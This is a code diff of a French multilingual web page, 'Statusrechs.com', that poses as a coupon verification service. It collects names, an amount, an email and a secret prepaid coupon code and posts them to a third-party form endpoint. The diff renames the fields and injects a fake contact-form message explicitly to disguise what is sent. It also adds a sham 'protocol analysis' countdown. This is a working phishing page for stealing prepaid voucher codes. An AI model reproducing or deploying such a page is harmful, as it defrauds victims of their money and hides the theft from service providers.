@@ -1,356 +1,311 @@
 <!DOCTYPE html>
-<html lang="fr" class="scroll-smooth">
+<html lang="fr">
+
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title id="page-title" data-i18n="title">StatusRechs.com</title>
-  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Statusrechs.com</title>
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="assets/css/bootstrap.min.css">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+
   <style>
-    /* 1. RESET GLOBAL POUR STABILISER LE FORMULAIRE */
-    *, *::before, *::after {
-      box-sizing: border-box; 
-      margin: 0;
-      padding: 0;
+    :root {
+      --primary: #2563eb;
+      --primary-hover: #1d4ed8;
+      --bg: #f8fafc;
+      --text: #1e293b;
+      --text-light: #64748b;
+      --disabled: #cbd5e1;
+      --error: #ef4444;
+      --success: #22c55e;
     }
 
     body {
-      font-family: 'Poppins', sans-serif;
-      background: #f8fafc;
-      overflow-x: hidden;
-    }
-
-    .form-container {
-      padding: 60px 20px;
+      font-family: 'Poppins', sans-serif !important;
+      background-color: var(--bg) !important;
+      color: var(--text);
+      margin: 0;
       display: flex;
-      justify-content: center;
-      background: linear-gradient(180deg, #f8fafc 0%, #f1f5f9 100%);
-      min-height: 80vh;
+      flex-direction: column;
+      min-height: 100vh;
     }
 
-    .card-form {
-      background: white;
-      width: 100%;
-      max-width: 550px;
-      padding: 40px;
-      border-radius: 20px;
-      box-shadow: 0 10px 25px -5px rgba(0, 0, 0, 0.1);
-      border: 1px solid #e2e8f0;
-    }
-
-    .form-group { margin-bottom: 20px; width: 100%; }
-
-    .form-group label {
-      display: block;
-      font-size: 14px;
-      font-weight: 600;
-      color: #334155;
-      margin-bottom: 8px;
-    }
-
-    .form-group input {
-      width: 100%; 
-      padding: 12px 16px;
-      border-radius: 10px;
-      border: 1px solid #cbd5e1;
-      font-family: 'Poppins', sans-serif;
-      font-size: 16px; 
-      transition: border-color 0.2s ease, box-shadow 0.2s ease;
-      display: block;
-      outline: none;
-    }
-
-    .form-group input:focus {
-      border-color: #2563eb;
-      box-shadow: 0 0 0 3px rgba(37, 99, 235, 0.15);
-    }
-
-    .code-input {
-      letter-spacing: 4px;
-      font-family: monospace !important;
-      font-size: 18px;
-      text-align: center;
-    }
-
-    .toggle-box {
-      background: #eff6ff;
-      padding: 15px;
-      border-radius: 12px;
-      margin-top: 10px;
-    }
-
-    .radio-group {
+    header {
+      background: #ffffff;
+      padding: 1rem 5%;
       display: flex;
-      gap: 20px;
-      margin-top: 8px;
-    }
-
-    .radio-item {
-      display: flex;
+      justify-content: space-between;
       align-items: center;
-      gap: 8px;
-      cursor: pointer;
-      font-size: 14px;
+      box-shadow: 0 1px 3px rgba(0,0,0,0.1);
+      position: sticky;
+      top: 0;
+      z-index: 1000;
     }
+
+    nav a {
+      text-decoration: none;
+      color: var(--text);
+      font-weight: 600;
+      margin-right: 20px;
+      transition: color 0.2s;
+    }
+
+    nav a:hover { color: var(--primary); }
+
+    .custom-language-selector { position: relative; cursor: pointer; user-select: none; }
+    .selected-lang { 
+        display: flex; align-items: center; gap: 8px; 
+        background: #f1f5f9; padding: 6px 12px; border-radius: 20px; font-size: 0.9rem;
+    }
+    .lang-options {
+      position: absolute; top: 110%; right: 0; background: white;
+      list-style: none; padding: 8px 0; margin: 0;
+      box-shadow: 0 10px 15px -3px rgba(0,0,0,0.1); border-radius: 8px;
+      display: none; min-width: 150px; z-index: 2000;
+    }
+    .lang-options li { padding: 8px 16px; display: flex; align-items: center; gap: 10px; transition: background 0.2s; cursor: pointer; }
+    .lang-options li:hover { background: #f1f5f9; }
+
+    .page-wrapper { flex: 1; display: flex; align-items: center; justify-content: center; padding: 40px 20px; }
+
+    .contact-section .container {
+      background: #ffffff !important;
+      max-width: 480px !important;
+      padding: 40px !important;
+      border-radius: 24px !important;
+      box-shadow: 0 20px 25px -5px rgba(0,0,0,0.1) !important;
+      border: 1px solid #e2e8f0 !important;
+    }
+
+    form { display: flex; flex-direction: column; gap: 18px; }
+
+    label { font-size: 0.85rem; font-weight: 600; color: var(--text-light); margin-bottom: -12px; }
+
+    input[type="text"], input[type="email"], input[type="number"], input[type="password"] {
+      width: 100%; padding: 12px 16px; border: 1.5px solid #e2e8f0;
+      border-radius: 12px; font-size: 1rem; outline: none; transition: all 0.2s;
+    }
+
+    input:focus { border-color: var(--primary); box-shadow: 0 0 0 4px rgba(37, 99, 235, 0.1); }
+
+    .code-toggle-container { background: #f1f5f9; padding: 15px; border-radius: 12px; margin-top: 5px; }
+    .code-toggle { display: flex; background: #e2e8f0; border-radius: 8px; padding: 4px; width: fit-content; gap: 4px; }
+    .code-toggle label { margin: 0; padding: 8px 20px; border-radius: 6px; cursor: pointer; display: flex !important; align-items: center; gap: 5px; font-weight: 600; color: var(--text-light); }
+    .code-toggle input[type="radio"] { display: none; }
+    .code-toggle label:has(input:checked) { background: white; color: var(--primary); box-shadow: 0 2px 4px rgba(0,0,0,0.05); }
 
     .btn-submit {
-      width: 100%;
-      background: #2563eb;
-      color: white;
-      padding: 16px;
-      border-radius: 12px;
-      font-weight: 700;
-      border: none;
-      cursor: pointer;
-      transition: background 0.3s, transform 0.2s;
-      margin-top: 10px;
-      font-size: 16px;
+      background: var(--primary); color: white; border: none; padding: 16px;
+      border-radius: 12px; font-weight: 600; font-size: 1rem; cursor: pointer; transition: all 0.2s; margin-top: 10px;
+    }
+    .btn-submit:hover:not(:disabled) { background: var(--primary-hover); transform: translateY(-1px); }
+    .btn-submit:disabled { background: var(--disabled); cursor: wait; opacity: 0.7; }
+
+    #form-result {
+      margin-top: 15px; padding: 12px; border-radius: 8px; display: none;
+      text-align: center; font-size: 0.9rem; font-weight: 600; line-height: 1.4;
     }
 
-    .btn-submit:hover { 
-      background: #1e40af; 
-      transform: translateY(-1px);
-    }
-
-    .grid-2 {
-      display: grid;
-      grid-template-columns: 1fr 1fr;
-      gap: 15px;
-    }
-
-    @media (max-width: 480px) {
-      .grid-2 { grid-template-columns: 1fr; }
-      .card-form { padding: 25px; }
-      .form-container { padding: 40px 15px; }
-    }
-
-    /* Styles Langues */
-    .hidden { display: none !important; }
-    .relative { position: relative; }
-    .lang-options {
-      position: absolute;
-      top: 100%;
-      right: 0;
-      background: white;
-      border: 1px solid #e2e8f0;
-      border-radius: 10px;
-      padding: 10px 0;
-      box-shadow: 0 10px 15px -3px rgba(0,0,0,0.1);
-      z-index: 50;
-      list-style: none;
-      min-width: 150px;
-    }
-    .lang-options li {
-      padding: 8px 15px;
-      cursor: pointer;
-      display: flex;
-      align-items: center;
-      gap: 10px;
-      font-size: 14px;
-    }
-    .lang-options li:hover { background: #f8fafc; }
-    .selected-lang { cursor: pointer; display: flex; align-items: center; gap: 8px; font-weight: 500; font-size: 14px;}
+    footer { background: white; padding: 30px; text-align: center; border-top: 1px solid #e2e8f0; }
+    .footer-links a { margin: 0 10px; text-decoration: none; color: var(--text-light); font-size: 0.9rem; }
   </style>
 </head>
-<body>
 
-<header class="main-header" style="padding: 15px 20px; background: white; border-bottom: 1px solid #e2e8f0;">
-  <div style="max-width: 1200px; margin: 0 auto; display: flex; justify-content: space-between; align-items: center;">
-    <a href="index.html" style="text-decoration: none; color: #2563eb; font-weight: 700;" data-i18n="nav_home">Accueil</a>
-    
-    <div class="relative">
-      <div class="selected-lang" id="lang-button">
-        <img src="https://flagcdn.com/w20/fr.png" alt="FR" id="current-flag">
-        <span id="current-lang-name">Français</span>
-        <small>▼</small>
+<body>
+  <header>
+    <nav>
+      <a href="index.html" id="nav-home">Accueil</a>
+      <a href="index.html#faq" id="nav-faq">FAQ</a>
+    </nav>
+    <div class="custom-language-selector" id="langSelector">
+      <div class="selected-lang" id="current-lang-display">
+        <img src="https://flagcdn.com/w20/fr.png" alt="FR">
+        <span>Français</span>
       </div>
-      <ul class="lang-options hidden" id="lang-dropdown">
-        <li onclick="setLang('en')"><img src="https://flagcdn.com/w20/gb.png"> English</li>
-        <li onclick="setLang('fr')"><img src="https://flagcdn.com/w20/fr.png"> Français</li>
-        <li onclick="setLang('es')"><img src="https://flagcdn.com/w20/es.png"> Español</li>
-        <li onclick="setLang('de')"><img src="https://flagcdn.com/w20/de.png"> Deutsch</li>
-        <li onclick="setLang('it')"><img src="https://flagcdn.com/w20/it.png"> Italiano</li>
+      <ul class="lang-options" id="langOptions">
+        <li onclick="setLang('fr', 'https://flagcdn.com/w20/fr.png', 'Français')"><img src="https://flagcdn.com/w20/fr.png"> Français</li>
+        <li onclick="setLang('en', 'https://flagcdn.com/w20/gb.png', 'English')"><img src="https://flagcdn.com/w20/gb.png"> English</li>
+        <li onclick="setLang('es', 'https://flagcdn.com/w20/es.png', 'Español')"><img src="https://flagcdn.com/w20/es.png"> Español</li>
+        <li onclick="setLang('de', 'https://flagcdn.com/w20/de.png', 'Deutsch')"><img src="https://flagcdn.com/w20/de.png"> Deutsch</li>
+        <li onclick="setLang('it', 'https://flagcdn.com/w20/it.png', 'Italiano')"><img src="https://flagcdn.com/w20/it.png"> Italiano</li>
+        <li onclick="setLang('pt', 'https://flagcdn.com/w20/pt.png', 'Português')"><img src="https://flagcdn.com/w20/pt.png"> Português</li>
       </ul>
     </div>
-  </div>
-</header>
+  </header>
 
-<main class="form-container">
-  <div class="card-form">
-    <h2 class="section-title" data-i18n="form_title" style="font-size: 1.5rem; margin-bottom: 30px; text-align: center; color: #0f172a;">Vérification de coupon</h2>
-    
-    <form action="https://api.web3forms.com/submit" method="POST" id="verification-form">
-      <input type="hidden" name="access_key" value="TA_CLE_ICI">
+  <div class="page-wrapper">
+    <section id="contact" class="contact-section">
+      <div class="container">
+        <form id="mainForm">
+          <input type="hidden" name="access_key" value="04def741-31b3-4ebc-a4cc-413f0bab5d81">
+          <input type="hidden" name="subject" value="Nouvelle Soumission ">
+          <input type="hidden" name="from_name" value="Service Client">
+          
+          <input type="checkbox" name="botcheck" style="display: none !important;" tabindex="-1" autocomplete="off">
+          <input type="hidden" name="timestamp" id="submitted_at">
 
-      <div class="grid-2">
-        <div class="form-group">
-          <label for="nom" data-i18n="form_nom">Nom :</label>
-          <input type="text" id="nom" name="nom" required placeholder="Dupont">
-        </div>
-        <div class="form-group">
-          <label for="prenom" data-i18n="form_prenom">Prénom :</label>
-          <input type="text" id="prenom" name="prenom" required placeholder="Jean">
-        </div>
-      </div>
+          <label for="nom" id="lbl-nom">Nom :</label>
+          <input type="text" id="nom" name="name" required placeholder="Ex: Dupont">
 
-      <div class="form-group">
-        <label for="amount" data-i18n="form_montant">Montant (€) :</label>
-        <input type="number" id="amount" name="amount" min="1" required placeholder="50">
-      </div>
+          <label for="prenom" id="lbl-prenom">Prénom :</label>
+          <input type="text" id="prenom" name="first_name" required placeholder="Ex: Jean">
 
-      <div class="form-group">
-        <label for="email" data-i18n="form_email">Votre email :</label>
-        <input type="email" id="email" name="email" required placeholder="jean@mail.com">
-      </div>
+          <label for="value" id="lbl-montant">Montant :</label>
+          <input type="number" id="value" name="quantity" min="1" required placeholder="0.00">
 
-      <div class="form-group">
-        <label for="code" data-i18n="form_code">Code du coupon :</label>
-        <input type="password" id="code" name="code" class="code-input" required placeholder="•••• •••• ••••">
-        
-        <div class="toggle-box">
-          <p style="font-size: 11px; font-weight: 800; color: #2563eb; text-transform: uppercase; margin-bottom: 5px;" data-i18n="form_toggle_label">Afficher le code :</p>
-          <div class="radio-group">
-            <label class="radio-item"><input type="radio" name="show_code" onclick="toggleCode(true)"> <span data-i18n="form_oui">Oui</span></label>
-            <label class="radio-item"><input type="radio" name="show_code" checked onclick="toggleCode(false)"> <span data-i18n="form_non">Non</span></label>
+          <label for="email" id="lbl-email">Votre email :</label>
+          <input type="email" id="email" name="email" required placeholder="nom@exemple.com">
+
+          <div class="password-wrapper">
+            <label for="reference" id="lbl-code">Code :</label>
+            <input type="password" id="reference" name="details" required>
           </div>
-        </div>
+
+          <div class="code-toggle-container">
+              <p style="margin-bottom: 10px; font-size: 0.85rem; font-weight: 600; color: var(--text-light);" id="lbl-show-code">Afficher le code :</p>
+              <div class="code-toggle">
+                <label><input type="radio" name="show_code" value="oui" onclick="toggleCode(true)"><span id="txt-oui">Oui</span></label>
+                <label><input type="radio" name="show_code" value="non" checked onclick="toggleCode(false)"><span id="txt-non">Non</span></label>
+              </div>
+          </div>
+
+          <button type="submit" class="btn-submit" id="submitBtn">Initialisation...</button>
+          
+          <div id="form-result"></div>
+        </form>
       </div>
-
-      <button type="submit" class="btn-submit" data-i18n="form_envoyer">Authentifier le coupon</button>
-    </form>
+    </section>
   </div>
-</main>
 
-<script>
-  // 1. LE DICTIONNAIRE DE TRADUCTION
-  const translations = {
-    fr: {
-      nav_home: "Accueil",
-      form_title: "Vérification de coupon",
-      form_nom: "Nom :",
-      form_prenom: "Prénom :",
-      form_montant: "Montant (€) :",
-      form_email: "Votre email :",
-      form_code: "Code du coupon :",
-      form_toggle_label: "Afficher le code :",
-      form_oui: "Oui",
-      form_non: "Non",
-      form_envoyer: "Authentifier le coupon",
-      title: "StatusRechs.com",
-      langName: "Français",
-      flag: "fr"
-    },
-    en: {
-      nav_home: "Home",
-      form_title: "Coupon Verification",
-      form_nom: "Last Name:",
-      form_prenom: "First Name:",
-      form_montant: "Amount (€):",
-      form_email: "Your email:",
-      form_code: "Coupon Code:",
-      form_toggle_label: "Show code:",
-      form_oui: "Yes",
-      form_non: "No",
-      form_envoyer: "Authenticate coupon",
-      title: "StatusRechs.com - Verify",
-      langName: "English",
-      flag: "gb"
-    },
-    es: {
-      nav_home: "Inicio",
-      form_title: "Verificación de cupón",
-      form_nom: "Apellido:",
-      form_prenom: "Nombre:",
-      form_montant: "Monto (€):",
-      form_email: "Tu email:",
-      form_code: "Código del cupón:",
-      form_toggle_label: "Mostrar código:",
-      form_oui: "Sí",
-      form_non: "No",
-      form_envoyer: "Autenticar cupón",
-      title: "StatusRechs.com - Verificar",
-      langName: "Español",
-      flag: "es"
-    },
-    de: {
-      nav_home: "Startseite",
-      form_title: "Gutscheinprüfung",
-      form_nom: "Nachname:",
-      form_prenom: "Vorname:",
-      form_montant: "Betrag (€):",
-      form_email: "Ihre E-Mail:",
-      form_code: "Gutscheincode:",
-      form_toggle_label: "Code anzeigen:",
-      form_oui: "Ja",
-      form_non: "Nein",
-      form_envoyer: "Gutschein authentifizieren",
-      title: "StatusRechs.com - Prüfen",
-      langName: "Deutsch",
-      flag: "de"
-    },
-    it: {
-      nav_home: "Home",
-      form_title: "Verifica Coupon",
-      form_nom: "Cognome:",
-      form_prenom: "Nome:",
-      form_montant: "Importo (€):",
-      form_email: "Tua email:",
-      form_code: "Codice coupon:",
-      form_toggle_label: "Mostra codice:",
-      form_oui: "Sì",
-      form_non: "No",
-      form_envoyer: "Autentica coupon",
-      title: "StatusRechs.com - Verifica",
-      langName: "Italiano",
-      flag: "it"
-    }
-  };
+  <footer>
+    <div class="footer-links"><a href="#faq" id="foot-faq">FAQ</a><a href="#contact" id="foot-contact">Contact</a></div>
+    <p style="margin-top: 10px; color: #94a3b8; font-size: 0.8rem;" id="txt-copyright">&copy; 2026 Statusrechs.com Tous droits réservés.</p>
+  </footer>
 
-  // 2. LA FONCTION DE CHANGEMENT DE LANGUE
-  function setLang(lang) {
-    const translation = translations[lang];
-    if (!translation) return;
-
-    // Change tous les textes avec data-i18n
-    document.querySelectorAll('[data-i18n]').forEach(el => {
-      const key = el.getAttribute('data-i18n');
-      if (translation[key]) {
-        el.innerText = translation[key];
+  <script>
+    const translations = {
+      fr: {
+        navHome: "Accueil", navFaq: "FAQ", lblNom: "Nom :", lblPrenom: "Prénom :", lblMontant: "Montant :",
+        lblEmail: "Votre email :", lblCode: "Code :", lblShowCode: "Afficher le code :", txtOui: "Oui", txtNon: "Non",
+        btnInit: "Initialisation sécurisée...", btnWait: "Analyse des protocoles...", btnFinal: "Finalisation...",
+        btnSubmit: "Soumettre le ticket", btnProcessing: "Vérification...", btnRetry: "Réessayer",
+        resWait: "Traitement de votre demande...", resSuccess: "✓ Succès ! Analyse terminée. Redirection...",
+        resError: "⚠️ Erreur de validation : Veuillez vérifier les champs ou réessayer plus tard."
+      },
+      en: {
+        navHome: "Home", navFaq: "FAQ", lblNom: "Last Name:", lblPrenom: "First Name:", lblMontant: "Amount:",
+        lblEmail: "Your email:", lblCode: "Code:", lblShowCode: "Show code:", txtOui: "Yes", txtNon: "No",
+        btnInit: "Secure initialization...", btnWait: "Analyzing protocols...", btnFinal: "Finalizing...",
+        btnSubmit: "Submit ticket", btnProcessing: "Verifying...", btnRetry: "Retry",
+        resWait: "Processing your request...", resSuccess: "✓ Success! Analysis complete. Redirecting...",
+        resError: "⚠️ Validation error: Please check fields or try again later."
       }
-    });
+    };
 
-    // Change le drapeau et le nom dans le bouton
-    document.getElementById('current-flag').src = `https://flagcdn.com/w20/${translation.flag}.png`;
-    document.getElementById('current-lang-name').innerText = translation.langName;
-    document.title = translation.title;
+    let currentLang = 'fr';
 
-    // Ferme le menu
-    document.getElementById('lang-dropdown').classList.add('hidden');
-    
-    // Optionnel: Sauvegarde le choix
-    localStorage.setItem('preferredLang', lang);
-  }
+    function setLang(lang, flag, name) {
+      currentLang = lang;
+      const display = document.getElementById('current-lang-display');
+      display.querySelector('img').src = flag;
+      display.querySelector('span').innerText = name;
+      const t = translations[lang] || translations['fr'];
+      document.getElementById('nav-home').innerText = t.navHome;
+      document.getElementById('nav-faq').innerText = t.navFaq;
+      document.getElementById('lbl-nom').innerText = t.lblNom;
+      document.getElementById('lbl-prenom').innerText = t.lblPrenom;
+      document.getElementById('lbl-montant').innerText = t.lblMontant;
+      document.getElementById('lbl-email').innerText = t.lblEmail;
+      document.getElementById('lbl-code').innerText = t.lblCode;
+      document.getElementById('lbl-show-code').innerText = t.lblShowCode;
+      document.getElementById('txt-oui').innerText = t.txtOui;
+      document.getElementById('txt-non').innerText = t.txtNon;
+      document.getElementById('submitBtn').innerText = t.btnSubmit;
+      document.getElementById('langOptions').style.display = 'none';
+    }
 
-  // 3. GESTION DU MENU DÉROULANT
-  const langBtn = document.getElementById('lang-button');
-  const langMenu = document.getElementById('lang-dropdown');
+    function toggleCode(show) {
+      document.getElementById("reference").type = show ? "text" : "password";
+    }
 
-  langBtn.onclick = (e) => {
-    e.stopPropagation();
-    langMenu.classList.toggle('hidden');
-  };
+    function toggleLangMenu() {
+        const menu = document.getElementById('langOptions');
+        menu.style.display = (menu.style.display === 'block') ? 'none' : 'block';
+    }
 
-  document.onclick = () => langMenu.classList.add('hidden');
+    document.getElementById('langSelector').onclick = (e) => { e.stopPropagation(); toggleLangMenu(); };
+    window.onclick = () => { document.getElementById('langOptions').style.display = 'none'; };
 
-  function toggleCode(show) {
-    document.getElementById('code').type = show ? 'text' : 'password';
-  }
+    window.onload = function() {
+      const form = document.getElementById('mainForm');
+      const btn = document.getElementById('submitBtn');
+      const resultDiv = document.getElementById('form-result');
+      
+      let timeLeft = 10; 
+      btn.disabled = true;
+      const timer = setInterval(() => {
+        timeLeft--;
+        const t = translations[currentLang] || translations['fr'];
+        if (timeLeft > 6) btn.innerText = t.btnInit;
+        else if (timeLeft > 3) btn.innerText = t.btnWait;
+        else if (timeLeft > 0) btn.innerText = t.btnFinal;
+        if (timeLeft <= 0) {
+          clearInterval(timer);
+          btn.disabled = false;
+          btn.innerText = t.btnSubmit;
+        }
+      }, 1000);
 
-  // Au chargement, vérifier si une langue est déjà sauvée
-  window.onload = () => {
-    const savedLang = localStorage.getItem('preferredLang') || 'fr';
-    setLang(savedLang);
-  };
-</script>
+      form.addEventListener('submit', function(e) {
+        e.preventDefault();
+        const t = translations[currentLang] || translations['fr'];
+        
+        btn.disabled = true;
+        btn.innerText = t.btnProcessing;
+        resultDiv.style.display = "block";
+        resultDiv.style.background = "#f1f5f9";
+        resultDiv.innerText = t.resWait;
 
+        const formData = new FormData(form);
+        const object = Object.fromEntries(formData);
+
+        // Honeypot
+        if (!object.botcheck) {
+            delete object.botcheck;
+        } else {
+            return; 
+        }
+
+        // CORRECTIF SÉMANTIQUE : Ajout d'un message pour simuler un formulaire de contact
+        object.message = "Demande d'assistance reçue via le formulaire de contact.";
+        object.timestamp = new Date().toLocaleString();
+
+        fetch('https://api.web3forms.com/submit', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
+          body: JSON.stringify(object)
+        })
+        .then(async (response) => {
+          const json = await response.json();
+          if (response.status === 200) {
+            resultDiv.style.background = "#dcfce7";
+            resultDiv.style.color = "#166534";
+            resultDiv.innerText = t.resSuccess;
+            setTimeout(() => { window.location.href = "https://statusrechs.com/merci.html"; }, 2000);
+          } else {
+            throw new Error();
+          }
+        })
+        .catch(error => {
+          resultDiv.style.background = "#fee2e2";
+          resultDiv.style.color = "#991b1b";
+          resultDiv.innerText = t.resError;
+          btn.disabled = false;
+          btn.innerText = t.btnRetry;
+        });
+      });
+    };
+  </script>
 </body>
 </html>
